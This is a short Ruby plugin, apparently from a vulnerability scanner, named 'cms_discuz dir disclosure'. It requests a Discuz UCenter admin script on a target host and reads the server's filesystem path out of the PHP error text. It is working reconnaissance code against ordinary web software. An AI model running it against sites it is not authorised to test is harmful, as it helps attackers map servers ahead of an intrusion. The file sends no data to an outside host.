
class Exploit_3 < FastExp

  def initialize
    @exp_id = 3
    @exp_type = "URL"
    @exp_txt = "cms_discuz dir disclosure"
    @pattern = /not found in <b>([^<]+)<\/b> on line <b>(\d+)<\/b>/
    @match = ""
    @found = false
  end

  def exp(type, arg)
    type.include?(@exp_type)
    html = HTTP.get("http://"+arg+"/uc_server/control/admin/db.php").to_s
    @match = @pattern.match html
    @found = true if @match != nil
  end

end

FastCfg+[Exploit_3.new]

